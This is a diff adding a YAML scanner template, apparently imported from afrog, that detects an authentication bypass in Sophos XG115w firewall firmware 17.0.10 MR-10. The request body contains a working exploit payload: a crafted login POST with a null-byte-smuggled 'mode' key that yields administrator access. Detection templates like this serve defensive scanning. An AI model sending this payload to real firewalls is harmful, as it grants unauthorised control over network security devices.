@@ -1,0 +1,30 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - body: |
+      mode=151&json={"username"%3a"admin","password"%3a"somethingnotpassword","languageid"%3a"1","browser"%3a"Chrome_101","accessaction"%3a1,+"mode\u0000ef"%3a716}&__RequestType=ajax&t=1653896534066
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '{"redirectionURL":"/webpages/index.jsp"'
+          - '"status":200'
+        condition: and
+    method: POST
+    path:
+      - '{{BaseURL}}/webconsole/Controller'
+id: sophos-xg115w-firewall-mr-10-authentication
+info:
+  author: Aryan Chehreghani
+  description: |
+    此漏洞允许攻击者通过绕过身份验证获得对防火墙管理空间的未经授权的访问。
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: Sophos XG115w Firewall 17.0.10 MR-10 - Authentication Bypass
+  severity: high
+  tags: sophos,xg115w,firewall,mr-10,authentication,bypass,argus-import
